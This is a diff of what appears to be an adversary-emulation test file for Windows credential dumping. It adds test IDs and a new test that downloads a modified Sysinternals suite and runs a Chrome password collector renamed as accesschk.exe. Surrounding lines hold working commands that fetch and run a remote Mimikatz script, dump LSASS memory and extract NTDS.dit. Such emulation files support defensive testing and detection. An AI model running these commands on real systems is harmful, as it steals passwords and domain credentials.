@@ -4,6 +4,7 @@ display_name: Credential Dumping
 
 atomic_tests:
 - name: Powershell Mimikatz
+  auto_generated_guid: 66fb0bc1-3c3f-47e9-a298-550ecfefacbc
   description: |
     Dumps credentials from memory via Powershell by invoking a remote mimikatz script.
 
@@ -26,6 +27,7 @@ atomic_tests:
       IEX (New-Object Net.WebClient).DownloadString('#{remote_script}'); Invoke-Mimikatz -DumpCreds
 
 - name: Gsecdump
+  auto_generated_guid: 96345bfc-8ae7-4b6a-80b7-223200f24ef9
   description: |
     Dump credentials from memory using Gsecdump.
 
@@ -73,6 +75,7 @@ atomic_tests:
       #{gsecdump_exe} -a
 
 - name: Windows Credential Editor
+  auto_generated_guid: 0f7c5301-6859-45ba-8b4d-1fac30fc31ed
   description: |
     Dump user credentials using Windows Credential Editor (supports Windows XP, 2003, Vista, 7, 2008 and Windows 8 only)
 
@@ -127,6 +130,7 @@ atomic_tests:
       del "#{output_file}" >nul 2>&1
 
 - name: Registry dump of SAM, creds, and secrets
+  auto_generated_guid: 5c2571d0-1572-416d-9676-812e64ca9f44
   description: |
     Local SAM (SAM & System), cached credentials (System & Security) and LSA secrets (System & Security) can be enumerated
     via three registry keys. Then processed locally using https://github.com/Neohapsis/creddump7
@@ -149,6 +153,7 @@ atomic_tests:
       del %temp%\security >nul 2> nul
 
 - name: Dump LSASS.exe Memory using ProcDump
+  auto_generated_guid: 0be2230c-9ab3-4ac2-8826-3199b9a0ebf8
   description: |
     The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals
     ProcDump.
@@ -190,6 +195,7 @@ atomic_tests:
       del "#{output_file}" >nul 2> nul
 
 - name: Dump LSASS.exe Memory using comsvcs.dll
+  auto_generated_guid: 2536dee2-12fb-459a-8c37-971844fa73be
   description: |
     The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with a built-in dll.
 
@@ -207,6 +213,7 @@ atomic_tests:
       Remove-Item $env:TEMP\lsass-comsvcs.dmp -ErrorAction Ignore
 
 - name: Dump LSASS.exe Memory using direct system calls and API unhooking
+  auto_generated_guid: 7ae7102c-a099-45c8-b985-4c7a2d05790d
   description: |
     The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved using direct system calls and API unhooking in an effort to avoid detection. 
     https://github.com/outflanknl/Dumpert
@@ -242,6 +249,7 @@ atomic_tests:
       del C:\windows\temp\dumpert.dmp >nul 2> nul
 
 - name: Dump LSASS.exe Memory using Windows Task Manager
+  auto_generated_guid: dea6c349-f1c6-44f3-87a1-1ed33a59a607
   description: |
     The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with the Windows Task
     Manager and administrative permissions.
@@ -262,6 +270,7 @@ atomic_tests:
         Right-click on lsass.exe in Task Manager. Select "Create Dump File". The following dialog will show you the path to the saved file.
 
 - name: Offline Credential Theft With Mimikatz
+  auto_generated_guid: 453acf13-1dbd-47d7-b28a-172ce9228023
   description: |
     The memory of lsass.exe is often dumped for offline credential theft attacks. Adversaries commonly perform this offline analysis with
     Mimikatz. This tool is available at https://github.com/gentilkiwi/mimikatz and can be obtained using the get-prereq_commands.
@@ -300,6 +309,7 @@ atomic_tests:
       #{mimikatz_exe} "sekurlsa::minidump #{input_file}" "sekurlsa::logonpasswords full" exit
 
 - name: Dump Active Directory Database with NTDSUtil
+  auto_generated_guid: 2364e33d-ceab-4641-8468-bfb1d7cc2723
   description: |
     This test is intended to be run on a domain Controller.
 
@@ -333,6 +343,7 @@ atomic_tests:
       ntdsutil "ac i ntds" "ifm" "create full #{output_folder}" q q
 
 - name: Create Volume Shadow Copy with NTDS.dit
+  auto_generated_guid: dcebead7-6c28-4b4b-bf3c-79deb1b1fc7f
   description: |
     This test is intended to be run on a domain Controller.
     
@@ -362,6 +373,7 @@ atomic_tests:
       vssadmin.exe create shadow /for=#{drive_letter}
 
 - name: Copy NTDS.dit from Volume Shadow Copy
+  auto_generated_guid: c6237146-9ea6-4711-85c9-c56d263a6b03
   description: |
     This test is intended to be run on a domain Controller.
 
@@ -416,6 +428,7 @@ atomic_tests:
       del "#{extract_path}\SYSTEM_HIVE"     >nul 2> nul
 
 - name: GPP Passwords (findstr)
+  auto_generated_guid: 870fe8fb-5e23-4f5f-b89d-dd7fe26f3b5f
   description: |
     Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller. This value can be decrypted with gpp-decrypt on Kali Linux.
 
@@ -438,6 +451,7 @@ atomic_tests:
       findstr /S cpassword %logonserver%\sysvol\*.xml
 
 - name: GPP Passwords (Get-GPPPassword)
+  auto_generated_guid: e9584f82-322c-474a-b831-940fd8b4455c
   description: |
     Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller.
     This test is intended to be run from a domain joined workstation, not on the Domain Controller itself.
@@ -482,6 +496,7 @@ atomic_tests:
       Get-GPPPassword -Verbose
 
 - name: LSASS read with pypykatz
+  auto_generated_guid: c37bc535-5c62-4195-9cc3-0517673171d8
   description: |
     Parses secrets hidden in the LSASS process with python. Similar to mimikatz's sekurlsa::
 
@@ -521,6 +536,7 @@ atomic_tests:
       pypykatz live lsa
 
 - name: Registry parse with pypykatz
+  auto_generated_guid: a96872b2-cbf3-46cf-8eb4-27e8c0e85263
   description: |
     Parses registry hives to obtain stored credentials
     
@@ -554,3 +570,40 @@ atomic_tests:
     elevation_required: true
     command: |
       pypykatz live registry
+
+- name: Run Chrome-password Collector
+  auto_generated_guid: 8c05b133-d438-47ca-a630-19cc464c4622
+  description: |
+    A modified sysinternals suite will be downloaded and staged. The Chrome-password collector, renamed accesschk.exe, will then be executed from #{file_path}.
+
+    Successful execution will produce stdout message stating "Copying db ... passwordsDB DB Opened. statement prepare DB connection closed properly". Upon completion, final output will be a file modification of $env:TEMP\sysinternals\passwordsdb.
+    
+    Adapted from [MITRE ATTACK Evals](https://github.com/mitre-attack/attack-arsenal/blob/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/data/abilities/credential-access/e7cab9bb-3e3a-4d93-99cc-3593c1dc8c6d.yml)
+  supported_platforms:
+    - windows
+  input_arguments:
+    file_path:
+      description: File path for modified Sysinternals
+      type: String
+      default: $env:TEMP
+
+  dependency_executor_name: powershell
+  dependencies:
+    - description: |
+        Modified Sysinternals must be located at #{file_path}
+      prereq_command: |
+        if (Test-Path #{file_path}\SysInternals) {exit 0} else {exit 1}
+      get_prereq_command: |
+        Invoke-WebRequest "https://github.com/mitre-attack/attack-arsenal/raw/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/Modified-SysInternalsSuite.zip" -OutFile "#{file_path}\Modified-SysInternalsSuite.zip"
+        Expand-Archive #{file_path}\Modified-SysInternalsSuite.zip #{file_path}\sysinternals -Force
+        Remove-Item #{file_path}\Modified-SysInternalsSuite.zip -Force
+
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      Set-Location -path "#{file_path}\Sysinternals";
+      ./accesschk.exe -accepteula .;
+
+    cleanup_command: |
+      Remove-Item #{file_path}\Sysinternals -Force -Recurse -ErrorAction Ignore
